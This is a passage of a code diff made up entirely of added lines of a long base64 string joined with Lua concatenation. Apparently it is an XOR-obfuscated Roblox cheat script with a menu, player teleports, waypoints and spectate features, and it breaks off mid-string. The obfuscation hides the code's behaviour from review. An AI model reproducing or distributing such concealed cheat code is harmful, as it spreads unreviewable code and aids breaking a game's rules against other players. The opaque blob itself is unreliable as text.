+    .. "8J60tLS08frwnum9np74+/f1+LTy4fr34P37+rTm8fLm8ef8w/Xt5Pv9+uDQ5vvk8Pvj+ry9"
+    .. "nrS0tLT4+/f1+LT69fnx57SptOP17eT7/frg2vX58ee8vZ60tLS05Pf1+Pi88uH69+D9+/q8"
+    .. "vZ60tLS0tLS0tMP17eT7/frg0Ob75PD74/quxvHy5vHn/Lz69fnx57i04Obh8b2etLS0tPH6"
+    .. "8L2etLS0tP3ytOfx+PH34PHww/Xt5Pv9+uC09frwtOP17eT7/frg58/n8fjx9+Dx8MP17eT7"
+    .. "/frgybTg/PH6nrS0tLS0tLS05Pf1+Pi88uH69+D9+/q8vZ60tLS0tLS0tLS0tLTD9e3k+/36"
+    .. "4NDm++Tw++P6rsfx4Lzv5/H48ffg8fDD9e3k+/364Om9nrS0tLS0tLS08frwvZ60tLS08frw"
+    .. "nvH68J6e+Pv39fi08uH69+D9+/q05/Xi8cP17eT7/frgvPr1+fG9nrS0tLT98rT6++C03MbE"
+    .. "tOD88fqetLS0tLS0tLTG9e3y/fH48K7a++D98u287560tLS0tLS0tLS0tLTA/eD48bSptLbD"
+    .. "1c3E293awMe2uJ60tLS0tLS0tLS0tLTX+/rg8frgtKm0ttf89eb19+Dx5rT957T6++C05vH1"
+    .. "8O26trietLS0tLS0tLS0tLS00OHm9eD9+/q0qbSnuJ60tLS0tLS0tLS0tLTd+fXz8bSptLb3"
+    .. "/eb3+PG59fjx5uC2nrS0tLS0tLS06b2etLS0tLS0tLTm8eDh5vqetLS0tPH68J6etLS0tPj7"
+    .. "9/X4tOT757SptNzGxLrE++f94P37+p60tLS0+Pv39fi0+Pv7/7SptNzGxLrX0ub1+fG62Pv7"
+    .. "/8Lx9+D75p6etLS0tOP17eT7/frg58/69fnxybSptO+etLS0tLS0tLTstKm05Pvnusy4nrS0"
+    .. "tLS0tLS07bSptOT757rNuJ60tLS0tLS0tO60qbTk++e6zrietLS0tLS0tLT47LSptPj7+/+6"
+    .. "zLietLS0tLS0tLT47bSptPj7+/+6zbietLS0tLS0tLT47rSptPj7+/+6zp60tLS06Z6etLS0"
+    .. "tOfx+PH34PHww/Xt5Pv9+uC0qbT69fnxnrS0tLTn9eLxw/Xt5Pv9+uDnwPvQ/ef/vL2etLS0"
+    .. "tObx8ubx5/zD9e3k+/364NDm++Tw++P6vL2enrS0tLTG9e3y/fH48K7a++D98u287560tLS0"
+    .. "tLS0tMD94PjxtKm0tsPVzcTb3drAtMfVwtHQtrietLS0tLS0tLTX+/rg8frgtKm0+vX58bie"
+    .. "tLS0tLS0tLTQ4eb14P37+rSptKe4nrS0tLS0tLS03fn18/G0qbS29vv7//n15v+2nrS0tLTp"
+    .. "vZ7x+vCenvj79/X4tPLh+vfg/fv6tODx+PHk++bgwPvD9e3k+/364Lz69fnxvZ60tLS0/fK0"
+    .. "+vvgtNzGxLT75rT6++C0+vX58bT75rT6++C04/Xt5Pv9+uDnz/r1+fHJtOD88fq05vHg4eb6"
+    .. "tPH68J6etLS0tPj79/X4tPD14PW0qbTj9e3k+/364OfP+vX58cmetLS0tOTm8eL9++HnxPvn"
+    .. "/eD9+/q0qbTcxsS619Lm9fnxnp60tLS03MbEutfS5vX58bSptNfS5vX58br4+/v/1eC8nrS0"
+    .. "tLS0tLS0wvH34Pvmp7r68eO88PXg9brsuLTw9eD1uu24tPD14PW67r24nrS0tLS0tLS0wvH3"
+    .. "4Pvmp7r68eO88PXg9brstL+08PXg9br47Li08PXg9brttL+08PXg9br47bi08PXg9brutL+0"
+    .. "8PXg9br47r2etLS0tL2enrS0tLTG9e3y/fH48K7a++D98u287560tLS0tLS0tMD94PjxtKm0"
+    .. "tsPVzcTb3drAtrietLS0tLS0tLTX+/rg8frgtKm0ttXm5v3i8fC09eC0tHYUNrS0trS6urT6"
+    .. "9fnxuJ60tLS0tLS0tNDh5vXg/fv6tKm0prietLS0tLS0tLTd+fXz8bSptLb69eL98/Xg/fv6"
+    .. "tp60tLS06b2e8frwnp7D9e3k+/364OfA9fau1+bx9eDx3frk4eC87560tLS02vX58bSptLbD"
+    .. "9e3k+/364LTa9fnxtrietLS0tMT49ffx/Pv48PHmwPHs4LSptLbR7PX55PjxrrTW9efxtrie"
+    .. "tLS0tMbx+fvi8cDx7ODV8uDx5tL79+Hn2Pvn4LSptPL1+OfxuJ60tLS01/X4+Pb19/+0qbTy"
+    .. "4fr34P37+rzi9fjh8b2etLS0tLS0tLT98rTi9fjh8bT1+vC04vX44fG06qm0tra04Pzx+p60"
+    .. "tLS0tLS0tLS0tLTn9eLxw/Xt5Pv9+uC84vX44fG9nrS0tLS0tLS08frwnrS0tLTx+vCe6b2e"
+    .. "nsP17eT7/frg58D19q7X5vH14PHW4eDg+/q87560tLS02vX58bSptLbH9eLxtNfh5ubx+uC0"
+    .. "xPvn/eD9+/q2uJ60tLS01/X4+Pb19/+0qbTy4fr34P37+ry9nrS0tLS0tLS0+Pv39fi0+vX5"
+    .. "8bSptLbD9e3k+/364LS2tLq6tOD75+Dm/frzvLfj9e3k+/364Nr1+fHnvL20v7SlvZ60tLS0"
+    .. "tLS0tOf14vHD9e3k+/364Lz69fnxvZ60tLS08frwnum9np7D9e3k+/364OfA9fau1+bx9eDx"
+    .. "1uHg4Pv6vO+etLS0tNr1+fG0qbS2wPH48eT75uC0wPu0x/H48ffg8fC2uJ60tLS01/X4+Pb1"
+    .. "9/+0qbTy4fr34P37+ry9nrS0tLS0tLS04PH48eT75uDA+8P17eT7/frgvOfx+PH34PHww/Xt"
+    .. "5Pv9+uC9nrS0tLTx+vCe6b2ensP17eT7/frg58D19q7X5vH14PHW4eDg+/q87560tLS02vX5"
+    .. "8bSptLbG8eDh5vq0wPu0xObx4v374ee0xPvn/eD9+/q2uJ60tLS01/X4+Pb19/+0qbTy4fr3"
+    .. "4P37+ry9nrS0tLS0tLS0/fK03MbEtPX68LTk5vHi/fvh58T75/3g/fv6tOD88fqetLS0tLS0"
+    .. "tLS0tLS0+Pv39fi09+Hm5vH64LSptNzGxLrX0ub1+fGetLS0tLS0tLS0tLS03MbEutfS5vX5"
+    .. "8bSptOTm8eL9++HnxPvn/eD9+/qetLS0tLS0tLS0tLS05Obx4v374efE++f94P37+rSptPfh"
+    .. "5ubx+uCetLS0tLS0tLTx+OfxnrS0tLS0tLS0tLS0tMb17fL98fjwrtr74P3y7bzvnrS0tLS0"
+    .. "tLS0tLS0tLS0tLTA/eD48bSptLbD1c3E293awMe2uJ60tLS0tLS0tLS0tLS0tLS01/v64PH6"
+    .. "4LSptLba+7Tk5vHi/fvh57Tk++f94P37+rT957T14vX9+PX2+PG6trietLS0tLS0tLS0tLS0"
+    .. "tLS0tNDh5vXg/fv6tKm0p7ietLS0tLS0tLS0tLS0tLS0tN359fPxtKm0tvf95vf48bn1+PHm"
+    .. "4LaetLS0tLS0tLS0tLS06b2etLS0tLS0tLTx+vCetLS0tPH68J7pvZ6ew/Xt5Pv9+uDnwPX2"
+    .. "rtfm8fXg8dbh4OD7+rzvnrS0tLTa9fnxtKm0ttDx+PHg8bTH8fjx9+Dx8LTD9e3k+/364La4"
+    .. "nrS0tLTX9fj49vX3/7SptPLh+vfg/fv6vL2etLS0tLS0tLT98rTn8fjx9+Dx8MP17eT7/frg"
+    .. "tPX68LTj9e3k+/364OfP5/H48ffg8fDD9e3k+/364Mm04Pzx+p60tLS0tLS0tLS0tLT4+/f1"
+    .. "+LTw8fjx4PHwtKm05/H48ffg8fDD9e3k+/364J60tLS0tLS0tLS0tLTj9e3k+/364OfP5/H4"
+    .. "8ffg8fDD9e3k+/364Mm0qbT6/fietLS0tLS0tLS0tLS05/H48ffg8fDD9e3k+/364LSptPr9"
+    .. "+J60tLS0tLS0tLS0tLTn9eLxw/Xt5Pv9+uDnwPvQ/ef/vL2etLS0tLS0tLS0tLS05vHy5vHn"
+    .. "/MP17eT7/frg0Ob75PD74/q8vZ6etLS0tLS0tLS0tLS0xvXt8v3x+PCu2vvg/fLtvO+etLS0"
+    .. "tLS0tLS0tLS0tLS0tMD94PjxtKm0tsPVzcTb3drAtNDR2NHA0dC2uJ60tLS0tLS0tLS0tLS0"
+    .. "tLS01/v64PH64LSptPDx+PHg8fC4nrS0tLS0tLS0tLS0tLS0tLTQ4eb14P37+rSptKa4nrS0"
+    .. "tLS0tLS0tLS0tLS0tLTd+fXz8bSptLbg5vXn/Lmmtp60tLS0tLS0tLS0tLTpvZ60tLS0tLS0"
+    .. "tPH68J60tLS08frwnum9np7D9e3k+/364OfA9fau1+bx9eDx1uHg4Pv6vO+etLS0tNr1+fG0"
+    .. "qbS21/jx9ea01fj4tMP17eT7/frg57a4nrS0tLTX9fj49vX3/7SptPLh+vfg/fv6vL2etLS0"
+    .. "tLS0tLTj9e3k+/364Oe0qbTv6Z60tLS0tLS0tOfx+PH34PHww/Xt5Pv9+uC0qbT6/fietLS0"
+    .. "tLS0tLTn9eLxw/Xt5Pv9+uDnwPvQ/ef/vL2etLS0tLS0tLTm8fLm8ef8w/Xt5Pv9+uDQ5vvk"
+    .. "8Pvj+ry9np60tLS0tLS0tMb17fL98fjwrtr74P3y7bzvnrS0tLS0tLS0tLS0tMD94PjxtKm0"
+    .. "tsPVzcTb3drAx7a4nrS0tLS0tLS0tLS0tNf7+uDx+uC0qbS21fj4tOf14vHwtOP17eT7/frg"
+    .. "57T3+PH15vHwura4nrS0tLS0tLS0tLS0tNDh5vXg/fv6tKm0p7ietLS0tLS0tLS0tLS03fn1"
+    .. "8/G0qbS24Ob15/y5praetLS0tLS0tLTpvZ60tLS08frwnum9np7D9e3k+/364OfA9fau1+bx"
+    .. "9eDx1uHg4Pv6vO+etLS0tNr1+fG0qbS2xeH99//k+/364LS0dhQ2tLTH9eLxtNfh5ubx+uC2"
+    .. "uJ60tLS01/X4+Pb19/+0qbTy4fr34P37+ry9nrS0tLS0tLS05/Xi8cP17eT7/frgvLbF4f33"
+    .. "/+T7/frgtr2etLS0tPH68J7pvZ6e+Pv18MP17eT7/frg59Lm+/nQ/ef/vL2e5vHy5vHn/MP1"
+    .. "7eT7/frg0Ob75PD74/q8vZ6eubm7u6mpqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqZ65ubu7tMTY1c3RxrTZ1drV09HGnrm5u7upqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamensT49e3x"
+    .. "5tn1+vXz8ebA9fau1+bx9eDxxPXm9fPm9eT8vO+etLS0tMD94PjxtKm0tnYIMrTE2NXN0ca0"
+    .. "2dXa1dPRxrS0u7S028TRxtXA28a019vax9vY0ba4nrS0tLTX+/rg8frgtKmetLS0tLS0tLS2"
+    .. "x/H48ffgtPW05Pj17fHmtOD7tP365+Tx9+C04Pzx/ea0+P3i8bT9+vL75vn14P37+ri04PH4"
+    .. "8eT75uC04Pu04Pzx+bT75rTn5PH34PXg8bTg/PH95rT3/PXm9ffg8ea6tp7pvZ6e+Pv39fi0"
+    .. "8uH69+D9+/q05Pj17fHm2vX58ee8vZ60tLS0+Pv39fi0+vX58ee0qbTv6Z60tLS08vvmtMu4"
+    .. "tOT49e3x5rT9+rT95PX95ue8xPj17fHm567T8eDE+PXt8ebnvL29tPD7nrS0tLS0tLS0/fK0"
+    .. "5Pj17fHmtOqptNj79/X4xPj17fHmtOD88fqetLS0tLS0tLS0tLS04PX2+PG6/frn8ebgvPr1"
+    .. "+fHnuLTk+PXt8ea62vX58b2etLS0tLS0tLTx+vCetLS0tPH68J60tLS04PX2+PG65/vm4Lz6"
+    .. "9fnx572etLS0tP3ytLf69fnx57SpqbSktOD88fq0+vX58ee0qbTvttr7tOT49e3x5ue26bTx"
+    .. "+vCetLS0tObx4OHm+rT69fnx557x+vCenvj79/X4tMT49e3x5tDm++Tw++P6tKm0xPj17fHm"
+    .. "2fX69fPx5sD19q7X5vH14PHQ5vvk8Pvj+rzvnrS0tLTa9fnxtKm0tsfx+PH34LTE+PXt8ea2"
+    .. "uJ60tLS02+Tg/fv657SptOT49e3x5tr1+fHnvL24nrS0tLTX4ebm8frg2+Tg/fv6tKm07+T4"
+    .. "9e3x5tr1+fHnvL3PpcnpuJ60tLS02eH44P3k+PHb5OD9+/rntKm08vX45/G4nrS0tLTS+PXz"
+    .. "tKm0tsfx+PH34PHwxPj17fHmtrietLS0tNf1+Pj29ff/tKm08uH69+D9+/q8++Tg/fv6vZ60"
+    .. "tLS0tLS0tPj79/X4tPr1+fG0qbTg7eTx+/K8++Tg/fv6vbSpqbS24PX2+PG2tPX68LT75OD9"
+    .. "+/rPpcm0++a0++Tg/fv6nrS0tLS0tLS05/H48ffg8fDE+PXt8ea0qbTE+PXt8ebnrtL9+vDS"
+    .. "/ebn4Nf8/fjwvPr1+fG9nrS0tLS0tLS0/fK0+vX58bSpqbS22vu05Pj17fHm57a04Pzx+rTn"
+    .. "8fjx9+Dx8MT49e3x5rSptPr9+LTx+vCetLS0tPH68J7pvZ6e+Pv39fi08uH69+D9+/q05vHy"
+    .. "5vHn/MT49e3x5tDm++Tw++P6vL2etLS0tPj79/X4tPr1+fHntKm05Pj17fHm2vX58ee8vZ60"
+    .. "tLS05Pf1+Pi88uH69+D9+/q8vZ60tLS0tLS0tMT49e3x5tDm++Tw++P6rsbx8ubx5/y8+vX5"
+    .. "8ee4tODm4fG9nrS0tLTx+vC9nvH68J6exPj17fHm2fX69fPx5sD19q7X5vH14PHH8ffg/fv6"
+    .. "vLbE2NXN0ca03drS28bZ1cDd29q2vZ6e+Pv39fi0xNna9fnx2PX28fi0qbTE+PXt8ebZ9fr1"
+    .. "8/HmwPX2rtfm8fXg8dj19vH4vLbE+PXt8ea0tHYUNrS02vv68ba4tLbh5/Hmtr2e+Pv39fi0"
+    .. "xNnc8fX44PzY9fbx+LSptMT49e3x5tn1+vXz8ebA9fau1+bx9eDx2PX28fi8ttzx9fjg/LS0"
+    .. "dhQ2tLS5uba4tLb88fXm4La9nvj79/X4tMTZ0P3n4PX69/HY9fbx+LSptMT49e3x5tn1+vXz"
+    .. "8ebA9fau1+bx9eDx2PX28fi8ttD95+D1+vfxtLR2FDa0tLm5tri0tubh+PHmtr2e+Pv39fi0"
+    .. "xNnA8fX52PX28fi0qbTE+PXt8ebZ9fr18/HmwPX2rtfm8fXg8dj19vH4vLbA8fX5tLR2FDa0"
+    .. "tLm5tri0tuf8/fH48La9np7E+PXt8ebZ9fr18/HmwPX2rtfm8fXg8cfx9+D9+/q8ttXXwN3b"
+    .. "2se2vZ6e+Pv39fi08uH69+D9+/q04PH48eT75uDA+8fx+PH34PHwvL2etLS0tP3ytOfx+PH3"
+    .. "4PHwxPj17fHmtOD88fqetLS0tLS0tLTg8fjx5Pvm4MD7xPj17fHmvOfx+PH34PHwxPj17fHm"
+    .. "vZ60tLS08frwnvH68J6exPj17fHm2fX69fPx5sD19q7X5vH14PHW4eDg+/q87560tLS02vX5"
+    .. "8bSptLbA8fjx5Pvm4LTA+7TH8fjx9+Dx8La4nrS0tLTX9fj49vX3/7SptODx+PHk++bgwPvH"
+    .. "8fjx9+Dx8J7pvZ6exPj17fHm2fX69fPx5sD19q7X5vH14PHW4eDg+/q87560tLS02vX58bSp"
+    .. "tLbH5PH34PXg8bTH8fjx9+Dx8La4nrS0tLTX9fj49vX3/7SptPLh+vfg/fv6vL2etLS0tLS0"
+    .. "tLT98rTn8fjx9+Dx8MT49e3x5rT1+vC05/H48ffg8fDE+PXt8ea61/z15vX34PHmtOD88fqe"
+    .. "tLS0tLS0tLS0tLS0+Pv39fi0/OH5tKm05/H48ffg8fDE+PXt8ea61/z15vX34PHmrtL9+vDS"
+    .. "/ebn4Nf8/fjw2/LX+PXn57y23OH59fr7/fC2vZ60tLS0tLS0tLS0tLT98rT84fm09frwtOP7"
+    .. "5v/n5PX38brX4ebm8frg1/X58eb1tOD88fqetLS0tLS0tLS0tLS0tLS0tOP75v/n5PX38brX"
+    .. "4ebm8frg1/X58eb1utf1+fHm9cfh9v7x9+C0qbT84fmetLS0tLS0tLS0tLS0tLS0tOfk8ffg"
+    .. "9eD9+vO0qbTg5uHxnrS0tLS0tLS0tLS0tLS0tLTG9e3y/fH48K7a++D98u287560tLS0tLS0"
+    .. "tLS0tLS0tLS0tLS0tMD94PjxtKm0tsTY1c3RxrTZ1drV09HGtrietLS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tLTX+/rg8frgtKm0tsfk8ffg9eD9+vO0tHYUNrS0trS6urTn8fjx9+Dx8MT49e3x5rrQ"
+    .. "/efk+PXt2vX58bietLS0tLS0tLS0tLS0tLS0tLS0tLTQ4eb14P37+rSptKa4nrS0tLS0tLS0"
+    .. "tLS0tLS0tLS0tLS03fn18/G0qbS28e3xtp60tLS0tLS0tLS0tLS0tLS06b2etLS0tLS0tLS0"
+    .. "tLS08frwnrS0tLS0tLS08frwnrS0tLTx+vCe6b2ensT49e3x5tn1+vXz8ebA9fau1+bx9eDx"
+    .. "1uHg4Pv6vO+etLS0tNr1+fG0qbS2x+D75LTH5PH34PXg/frztrietLS0tNf1+Pj29ff/tKm0"
+    .. "8uH69+D9+/q8vZ60tLS0tLS0tP3ytNzh+fX6+/3wtPX68LTj++b/5+T19/G61+Hm5vH64Nf1"
+    .. "+fHm9bTg/PH6nrS0tLS0tLS0tLS0tOP75v/n5PX38brX4ebm8frg1/X58eb1utf1+fHm9cfh"
+    .. "9v7x9+C0qbTc4fn1+vv98J60tLS0tLS0tPH68J60tLS0tLS0tOfk8ffg9eD9+vO0qbTy9fjn"
+    .. "8Z60tLS08frwnum9np7E+PXt8ebZ9fr18/HmwPX2rtfm8fXg8dbh4OD7+rzvnrS0tLTa9fnx"
+    .. "tKm0ttz98/z4/fP84LTH8fjx9+Dx8La4nrS0tLTX9fj49vX3/7SptPLh+vfg/fv6vL2etLS0"
+    .. "tLS0tLT98rT6++C05/H48ffg8fDE+PXt8ea0++a0+vvgtOfx+PH34PHwxPj17fHmutf89eb1"
+    .. "9+Dx5rTg/PH6tObx4OHm+rTx+vCenrS0tLS0tLS0+Pv39fi08ez95+D9+vO0qbTn8fjx9+Dx"
+    .. "8MT49e3x5rrX/PXm9ffg8eau0v368NL95ufg1/z9+PC8tsfk9ffx3OH2y8fx+PH34PHwtr2e"
+    .. "tLS0tLS0tLT98rTx7P3n4P3687Tg/PH6nrS0tLS0tLS0tLS0tPHs/efg/frzrtDx5+Dm++28"
+    .. "vZ60tLS0tLS0tLS0tLTm8eDh5vqetLS0tLS0tLTx+vCenrS0tLS0tLS0+Pv39fi0/P3z/Pj9"
+    .. "8/zgtKm03frn4PX69/G6+vHjvLbc/fP8+P3z/OC2vZ60tLS0tLS0tPz98/z4/fP84Lra9fnx"
+    .. "tKm0tsfk9ffx3OH2y8fx+PH34PHwtp60tLS0tLS0tPz98/z4/fP84LrS/fj4wOb1+ufk9ebx"
+    .. "+vfttKm0pLqioZ60tLS0tLS0tPz98/z4/fP84Lrb4eD4/frxwOb1+ufk9ebx+vfttKm0pJ60"
+    .. "tLS0tLS0tPz98/z4/fP84LrS/fj41/v4++a0qbTX+/j75qe68ub7+cbT1rymoaG4tKalpLi0"
+    .. "rKS9nrS0tLS0tLS0/P3z/Pj98/zgutvh4Pj9+vHX+/j75rSptNf7+Pvmp7ry5vv5xtPWvKah"
+    .. "obi0pqChuLSlrKS9nrS0tLS0tLS0/P3z/Pj98/zgutDx5OD82fvw8bSptNH64fm63P3z/Pj9"
+    .. "8/zg0PHk4PzZ+/DxutX44/Xt59v6wPvknrS0tLS0tLS0/P3z/Pj98/zgusT15vH64LSptOfx"
+    .. "+PH34PHwxPj17fHmutf89eb19+Dx5p60tLS08frwnum9np7g9ef/uufk9eP6vPLh+vfg/fv6"
+    .. "vL2etLS0tOP8/fjxtOD15/+64/X94LykuqahvbTw+560tLS0tLS0tP3ytOfx+PH34PHwxPj1"
+    .. "7fHmtPX68LTn8fjx9+Dx8MT49e3x5rrE9ebx+uC04Pzx+p60tLS0tLS0tLS0tLT4+/f1+LT3"
+    .. "/PXm9ffg8ea0qbTn8fjx9+Dx8MT49e3x5rrX/PXm9ffg8eaetLS0tLS0tLS0tLS0+Pv39fi0"
+    .. "/OH5tKm09/z15vX34PHmtPX68LT3/PXm9ffg8eau0v368NL95ufg1/z9+PDb8tf49efnvLbc"
+    .. "4fn1+vv98La9nrS0tLS0tLS0tLS0tPj79/X4tOb7++C0qbT3/PXm9ffg8ea09frwtPf89eb1"
+    .. "9+Dx5q7S/frw0v3m5+DX/P348Ly23OH59fr7/fDG+/vgxPXm4La9np60tLS0tLS0tLS0tLTE"
+    .. "2dr1+fHY9fbx+K7H8eC8nrS0tLS0tLS0tLS0tLS0tLS2xPj17fHmtLR2FDa0tLa0urq05/H4"
+    .. "8ffg8fDE+PXt8ea60P3n5Pj17dr1+fG0urq0trS01La0urq05/H48ffg8fDE+PXt8ea62vX5"
+    .. "8bietLS0tLS0tLS0tLS0tLS0tLbh5/Hmtp60tLS0tLS0tLS0tLS9np60tLS0tLS0tLS0tLTE"
+    .. "2dzx9fjg/Nj19vH4rsfx4LyetLS0tLS0tLS0tLS0tLS0tLbc8fX44Py0tHYUNrS0trS6up60"
+    .. "tLS0tLS0tLS0tLS0tLS0vPzh+bT1+vC0vPn14Py68vj7++a8/OH5utzx9fjg/LS/tKS6ob20"
+    .. "urq0trS7tLa0urq0+fXg/Lry+Pv75rz84fm62fXs3PH1+OD8tL+0pLqhvb20++a0trm5tr24"
+    .. "nrS0tLS0tLS0tLS0tLS0tLS2/PH15uC2nrS0tLS0tLS0tLS0tL2enrS0tLS0tLS0tLS0tPj7"
+    .. "9/X4tPD95+D1+vfxtKm03MbEtPX68LTm+/vgtPX68LS83MbEusT75/3g/fv6tLm05vv74LrE"
+    .. "++f94P37+r262fXz+v3g4fDxnrS0tLS0tLS0tLS0tMTZ0P3n4PX69/HY9fbx+K7H8eC8nrS0"
+    .. "tLS0tLS0tLS0tLS0tLS20P3n4PX69/G0tHYUNrS0trS6urS88P3n4PX69/G09frwtLz59eD8"
+    .. "uvL4+/vmvPD95+D1+vfxvbS6urS2tOfg4fDntr20++a0trm5tr24nrS0tLS0tLS0tLS0tLS0"
+    .. "tLS25uH48ea2nrS0tLS0tLS0tLS0tL2enrS0tLS0tLS0tLS0tMTZwPH1+dj19vH4rsfx4Lye"
+    .. "tLS0tLS0tLS0tLS0tLS0tLbA8fX5tLR2FDa0tLa0urq0vOfx+PH34PHwxPj17fHmusDx9fm0"
+    .. "9frwtOfx+PH34PHwxPj17fHmusDx9fm62vX58bT75rS22vHh4Ob1+La9uJ60tLS0tLS0tLS0"
+    .. "tLS0tLS0tuf8/fH48LaetLS0tLS0tLS0tLS0vZ60tLS0tLS0tPH45/GetLS0tLS0tLS0tLS0"
+    .. "xNna9fnx2PX28fiux/HgvLbE+PXt8ea0tHYUNrS02vv68ba4tLbh5/Hmtr2etLS0tLS0tLS0"
+    .. "tLS0xNnc8fX44PzY9fbx+K7H8eC8ttzx9fjg/LS0dhQ2tLS5uba4tLb88fXm4La9nrS0tLS0"
+    .. "tLS0tLS0tMTZ0P3n4PX69/HY9fbx+K7H8eC8ttD95+D1+vfxtLR2FDa0tLm5tri0tubh+PHm"
+    .. "tr2etLS0tLS0tLS0tLS0xNnA8fX52PX28fiux/HgvLbA8fX5tLR2FDa0tLm5tri0tuf8/fH4"
+    .. "8La9nrS0tLS0tLS08frwnrS0tLTx+vCe8frwvZ6exPj17fHm57rE+PXt8ebV8PDx8K7X+/r6"
+    .. "8ffgvPLh+vfg/fv6vL2etLS0tOD15/+64/X94LykuqG9nrS0tLTm8fLm8ef8xPj17fHm0Ob7"
+    .. "5PD74/q8vZ7x+vC9np7E+PXt8ebnusT49e3x5sbx+fvi/frzrtf7+vrx9+C88uH69+D9+/q8"
+    .. "5Pj17fHmvZ60tLS0/fK05/H48ffg8fDE+PXt8ea0qam05Pj17fHmtOD88fqetLS0tLS0tLTn"
+    .. "8fjx9+Dx8MT49e3x5rSptPr9+J60tLS08frwnrS0tLTm8fLm8ef8xPj17fHm0Ob75PD74/q8"
+    .. "vZ7x+vC9np65ubu7qampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampnrm5u7u019va0t3TwcbVwN3b2p65ubu7qampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampnp7X+/ry/fPh5vXg/fv6wPX2"
+    .. "rtfm8fXg8cT15vXz5vXk/Lzvnp60tLS0wP3g+PG0qbS2dggytMfNx8DR2bTX29rS3dPBxtXA"
+    .. "3dvatLS7tLTExtHS0cbR2tfRx7a4np60tLS01/v64PH64LSpnrS0tLS0tLS0tsDh+vG0+fvi"
+    .. "8fnx+uC4tP364PHm8vX38bT1+vC04PXm8/Hg/frztOTm8fLx5vH69/Hnuraenum9np7X+/ry"
+    .. "/fPh5vXg/fv6wPX2rtfm8fXg8cfx9+D9+/q8nrS0tLS2xNXG1dnRwNHGx7S0u7S02dvC0dnR"
+    .. "2sC2nr2entf7+vL98+Hm9eD9+/rA9fau1+bx9eDxx/j98PHmvO+enrS0tLTa9fnxtKm0ttDx"
+    .. "8vXh+OC0w/X4/8fk8fHwtrienrS0tLTG9frz8bSptO+etLS0tLS0tLSluJ60tLS0tLS0tKah"
+    .. "pJ60tLS06bienrS0tLTd+vfm8fnx+uC0qbSluJ6etLS0tMfh8vL97LSptLa0x8TQtrienrS0"
+    .. "tLTX4ebm8frgwvX44fG0qbSlorienrS0tLTS+PXztKm0ttf7+vL988P1+P/H5PHx8La4np60"
+    .. "tLS01/X4+Pb19/+0qbTy4fr34P37+rzi9fjh8b2enrS0tLS0tLS04/X4/8fk8fHwtKmetLS0"
+    .. "tLS0tLS0tLS04vX44fGenrS0tLS0tLS0/fK03OH59fr7/fC04Pzx+p60tLS0tLS0tLS0tLTc"
+    .. "4fn1+vv98LrD9fj/x+Tx8fC0qZ60tLS0tLS0tLS0tLS0tLS04vX44fGetLS0tLS0tLTx+vCe"
+    .. "nrS0tLTx+vCenum9np7X+/ry/fPh5vXg/fv6wPX2rtfm8fXg8cf4/fDx5rzvnp60tLS02vX5"
+    .. "8bSptLbQ8fL14fjgtNL4/fP84Mfk8fHwtrienrS0tLTG9frz8bSptO+etLS0tLS0tLSlpLie"
+    .. "tLS0tLS0tLSnpKSetLS0tOm4np60tLS03fr35vH58frgtKm0obienrS0tLTH4fLy/ey0qbS2"
+    .. "tMfE0La4np60tLS01+Hm5vH64ML1+OHxtKm0oaS4np60tLS00vj187SptLbX+/ry/fPS+P3z"
+    .. "/ODH5PHx8La4np60tLS01/X4+Pb19/+0qbTy4fr34P37+rzi9fjh8b2enrS0tLS0tLS08vj9"
+    .. "8/zgx+Tx8fC0qZ60tLS0tLS0tLS0tLTi9fjh8Z6etLS0tPH68J6e6b2enrm5u7upqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqameubm7u7TA"
+    .. "3NHZ0ceeubm7u6mpqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqZ6e1/v68v3z4eb14P37+sD19q7X5vH14PHH8ffg/fv6vJ60tLS0tt3awNHG"
+    .. "0tXX0bS0u7S019vG0baevZ6e1/v68v3z4eb14P37+sD19q7X5vH14PHQ5vvk8Pvj+rzvnp60"
+    .. "tLS02vX58bSptLbd+uDx5vL19/G0wPzx+fG2uJ6etLS0tNvk4P37+ue0qbTvnp60tLS0tLS0"
+    .. "tLbQ8fL14fjgtrietLS0tLS0tLS20PXm/9b44fG2uJ60tLS0tLS0tLbb9/H1+ra4nrS0tLS0"
+    .. "tLS0ttX58eD87efgtrietLS0tLS0tLS21vj7+/m2uJ60tLS0tLS0tLbH8ebx+v3g7ba4nrS0"
+    .. "tLS0tLS0ttPm8fH6trietLS0tLS0tLS21fn28ebT+PvjtrietLS0tLS0tLS22P3z/OC2uJ60"
+    .. "tLS0tLS0tLbb5vb94PX4tp6etLS0tOm4np60tLS01+Hm5vH64Nvk4P37+rSptO+etLS0tLS0"
+    .. "tLS22+b2/eD1+LaetLS0tOm4np60tLS02eH44P3k+PHb5OD9+/rntKm08vX45/G4np60tLS0"
+    .. "0vj187SptLbA/PH58ba4np60tLS01/X4+Pb19/+0qbTy4fr34P37+rz75OD9+/q9np60tLS0"
+    .. "tLS0tPj79/X4tOD88fnxnp60tLS0tLS0tP3ytODt5PH78rz75OD9+/q9tKmptLbg9fb48ba0"
+    .. "4Pzx+p60tLS0tLS0tLS0tLTg/PH58bSptPvk4P37+s+lyZ60tLS0tLS0tPH45/GetLS0tLS0"
+    .. "tLS0tLS04Pzx+fG0qbT75OD9+/qetLS0tLS0tLTx+vCenrS0tLS0tLS0/fK04Pzx+fG04Pzx"
+    .. "+p6etLS0tLS0tLS0tLS05Pf1+Pi88uH69+D9+/q8vZ6etLS0tLS0tLS0tLS0tLS0tP3ytOD8"
+    .. "8fnxtKmptLbb5vb94PX4trTg/PH6nrS0tLS0tLS0tLS0tLS0tLS0tLS0w/368Pvjrtn78P3y"
+    .. "7cD88fnxvMfk9ffxwPzx+fG9nrS0tLS0tLS0tLS0tLS0tLTx+OfxnrS0tLS0tLS0tLS0tLS0"
+    .. "tLS0tLS0w/368Pvjrtn78P3y7cD88fnxvOD88fnxvZ60tLS0tLS0tLS0tLS0tLS08frwnp60"
+    .. "tLS0tLS0tLS0tLTx+vC9np60tLS0tLS0tPH68J6etLS0tPH68J6e6b2entf7+vL98+Hm9eD9"
+    .. "+/rA9fau1+bx9eDxxPXm9fPm9eT8vO+enrS0tLTA/eD48bSptLbHxNXX0bTcwda0tHYUNrS0"
